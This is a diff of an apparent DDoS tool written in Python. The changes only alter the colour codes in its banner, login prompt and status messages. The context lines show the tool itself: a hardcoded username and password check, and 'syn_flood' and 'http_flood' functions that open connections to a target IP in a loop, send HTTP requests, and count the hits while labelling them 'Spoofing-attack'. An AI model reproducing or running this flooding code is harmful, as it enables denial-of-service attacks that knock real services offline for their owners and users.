@@ -33,9 +33,9 @@ print(f"\033[97m ║ \033[100m{' ' * 4}v.1.0{' ' * 69}\033[0m ║")
 print(f"\033[97m ║ \033[100m{' ' * 4}https://www.https//kunkaffa@gmail.com{' ' * 37}\033[0m ║")
 print(f"\033[97m ╚{'═' * 80}╝")
 while attemps < 100:
-    print("\033[38;5;6mm┏━━KunFayz━━⬣")
-    username = input("\033[96m┗> Enter Username: \033[30m")
-    password = input("\033[96m┗> Enter password: \033[30m")
+    print("\033[38;5;6m┏━━KunFayz━━⬣")
+    username = input("\033[38;5;6mm┗> Enter Username: \033[30m")
+    password = input("\033[38;5;6mm┗> Enter password: \033[30m")
 
     if username == 'pekat' and password == 'malam':
         print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
@@ -109,8 +109,8 @@ def syn_flood(ip, port, duration):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
             sent += 1
-            print(f"\033[100m\033[97mSyn flood\033[0m \033[32m{sent} \033[95m{ip}\033[37mSpoofing-attack")
-            print(f"\033[48;5;7m\033[30mSyn flood\033[0m \033[33m{sent} \033[96m{ip} \033[1mSpoofing-attack\033[0m")
+            print(f"\033[100m\033[97mSyn flood\033[0m \033[32m{sent} \033[38;5;5m {ip} \033[37mSpoofing-attack")
+            print(f"\033[48;5;7m\033[30mSyn flood\033[0m \033[33m{sent} \033[38;5;6m {ip} \033[1mSpoofing-attack\033[0m")
             sock.close()
         except OSError:
             pass
@@ -141,8 +141,8 @@ def http_flood(ip, port, duration):
             sock.connect((ip, port))
             sock.sendall(http_request)
             sent += 1
-            print(f"\033[748;5;3m\033[30mHttp-flood\033[0m \033[32m{sent} \033[37m" +(http_request)+ "")
-            print(f"\033[33m[]  \033[32mD E B 0 R A  \033[32mHTTP FL00D \033[0m \033[33m{sent} TARGET  \033[38;5;206m{ip}. \033[33mrunning\033[0m")
+            print(f"\033[103m\033[30mHttp-flood\033[0m \033[32m{sent} \033[37m{ip} \033[37mworking")
+            print(f" \033[33mHttp-flood \033[33m{sent} \033[46m{ip} \033[33mworking")
         except KeyboardInterrupt:
             print("\n[-] Attack stopped by user")
             break
